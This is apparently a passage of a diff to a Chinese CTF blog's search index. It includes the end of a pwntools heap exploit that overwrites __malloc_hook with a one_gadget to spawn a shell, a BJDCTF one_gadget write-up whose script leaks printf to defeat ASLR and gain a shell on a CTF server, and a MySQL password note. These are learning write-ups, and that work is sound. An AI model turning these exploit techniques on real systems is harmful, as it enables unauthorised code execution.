class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Input the index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)-<span class="number">0x260</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x78</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\xff&#x27;</span>*<span class="number">8</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Here is it :&#x27;</span>)</span><br><span class="line">main = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">malloc_hook = main - <span class="number">0x10</span></span><br><span class="line">libc = main - <span class="number">0x3ebc40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">8</span> + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0</span>) + p64(malloc_hook))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,p64(libc+<span class="number">0x10a38c</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the index:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input the size:&#x27;</span>,<span class="string">&#x27;0x20&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>比赛WriteUp</category>
       </categories>
   </entry>
   <entry>
@@ -740,6 +740,14 @@
       </tags>
   </entry>
   <entry>
+    <title>Untitled</title>
+    <url>/article/Untitled/</url>
+    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Ubuntu20_zsh</title>
     <url>/article/Ubuntu20_zsh/</url>
     <content><![CDATA[<h1 id="Ubuntu20下zsh、oh-my-zsh、插件和主题安装"><a href="#Ubuntu20下zsh、oh-my-zsh、插件和主题安装" class="headerlink" title="Ubuntu20下zsh、oh-my-zsh、插件和主题安装"></a>Ubuntu20下zsh、oh-my-zsh、插件和主题安装</h1><p>之前ubuntu16 18都没写过自己安装zsh的过程，借此次ubuntu20顺手写一下</p>
@@ -803,14 +811,6 @@
       <tags>
         <tag>笔记</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Untitled</title>
-    <url>/article/Untitled/</url>
-    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
-      </categories>
   </entry>
   <entry>
     <title>Canary</title>
@@ -948,14 +948,6 @@
       </tags>
   </entry>
   <entry>
-    <title>code</title>
-    <url>/article/code/</url>
-    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CISCN_2019</title>
     <url>/article/CISCN_2019/</url>
     <content><![CDATA[<h1 id="ciscn-2019"><a href="#ciscn-2019" class="headerlink" title="ciscn_2019"></a>ciscn_2019</h1><span id="more"></span>
@@ -994,6 +986,14 @@
       </categories>
   </entry>
   <entry>
+    <title>code</title>
+    <url>/article/code/</url>
+    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
+      </categories>
+  </entry>
+  <entry>
     <title>Hello World</title>
     <url>/article/Hello%20World/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! </p>
@@ -1012,6 +1012,52 @@
 
 <p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>mysql</title>
+    <url>/article/mysql/</url>
+    <content><![CDATA[<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="ssh连接服务器"><a href="#ssh连接服务器" class="headerlink" title="ssh连接服务器"></a>ssh连接服务器</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh username@ipaddress</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><p>想修改密码，网上找到的指令，结果报错了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update user set password&#x3D;password(&#39;新密码&#39;) where user&#x3D;&#39;用户名&#39;;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#39;password&#39; in &#39;field list&#39;</span><br></pre></td></tr></table></figure>
+
+<p>错误的原因是 5.7版本下的mysql数据库下已经没有password这个字段了，password字段改成了authentication_string</p>
+<p>正确姿势：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; update mysql.user set authentication_string&#x3D;password(&#39;****&#39;) where user&#x3D;&#39;****&#39;;</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 1</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>One_gadget</title>
+    <url>/article/One_gadget/</url>
+    <content><![CDATA[<h1 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h1><span id="more"></span>
+<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>ida看main函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201127174547573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再看init函数</p>
+<p><img src="https://img-blog.csdnimg.cn/20201127174608655.png" alt="在这里插入图片描述"></p>
+<p>会输出一个printf的地址</p>
+<p>使用one_gadget，计算一下libc的基址<br>buuctf给了远程的libc文件，下载下来</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget [libcfilename]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20201127175251109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25812</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x106ef8</span></span><br><span class="line">payload = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your one gadget:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>OneGadget</tag>
+      </tags>
   </entry>
   <entry>
     <title>orw</title>
@@ -1097,37 +1143,6 @@
       </tags>
   </entry>
   <entry>
-    <title>One_gadget</title>
-    <url>/article/One_gadget/</url>
-    <content><![CDATA[<h1 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h1><span id="more"></span>
-<h2 id="BJDCTF-2nd-one-gadget"><a href="#BJDCTF-2nd-one-gadget" class="headerlink" title="[BJDCTF 2nd]one_gadget"></a>[BJDCTF 2nd]one_gadget</h2><p>ida看main函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201127174547573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再看init函数</p>
-<p><img src="https://img-blog.csdnimg.cn/20201127174608655.png" alt="在这里插入图片描述"></p>
-<p>会输出一个printf的地址</p>
-<p>使用one_gadget，计算一下libc的基址<br>buuctf给了远程的libc文件，下载下来</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">one_gadget [libcfilename]</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20201127175251109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25812</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.29.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">one_gadget = <span class="number">0x106ef8</span></span><br><span class="line">payload = libc_base + one_gadget</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me your one gadget:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>WriteUp</category>
-      </categories>
-      <tags>
-        <tag>OneGadget</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>shellcode</title>
-    <url>/article/shellcode/</url>
-    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
-      <categories>
-        <category>WriteUp/笔记</category>
-      </categories>
-  </entry>
-  <entry>
     <title>program</title>
     <url>/article/program/</url>
     <content><![CDATA[<p>记录编程相关</p>
@@ -1158,6 +1173,14 @@
 ]]></content>
       <categories>
         <category>program</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>shellcode</title>
+    <url>/article/shellcode/</url>
+    <content><![CDATA[<h1 id="title"><a href="#title" class="headerlink" title="title"></a>title</h1>]]></content>
+      <categories>
+        <category>WriteUp/笔记</category>
       </categories>
   </entry>
   <entry>
